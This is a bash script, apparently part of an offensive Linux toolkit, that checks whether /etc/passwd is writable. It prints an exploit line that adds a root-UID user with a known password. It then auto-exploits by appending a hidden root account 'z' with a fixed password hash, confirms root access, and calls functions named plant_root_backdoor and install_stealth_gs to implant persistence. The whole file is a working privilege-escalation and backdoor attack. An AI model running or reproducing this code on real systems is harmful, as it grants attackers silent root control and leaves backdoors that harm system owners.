#!/bin/bash
source "$(dirname "$0")/00_common.sh"

info "Checking /etc/passwd writability..."

if [ -w /etc/passwd ]; then
    success "VULNERABLE: /etc/passwd is writable!"
    echo ""
    echo "Exploit: echo 'hacker:$(openssl passwd -1 pass123):0:0::/root:/bin/bash' >> /etc/passwd"
    echo "Then: su hacker (password: pass123)"
    
    # Auto exploit
    if command -v openssl >/dev/null 2>&1; then
        warn "Auto-exploiting..."
        echo "z:\$1\$xyz\$Qw5Lh7B5zXxGz7vYwLwJz/:0:0::/root:/bin/bash" >> /etc/passwd 2>/dev/null
        if su -c "id" z 2>/dev/null | grep -q "uid=0"; then
            success "ROOT ACCESS via /etc/passwd!"
            su -c "$(declare -f install_stealth_gs plant_root_backdoor); plant_root_backdoor" z 2>/dev/null
        fi
    fi
else
    fail "/etc/passwd not writable"
fi
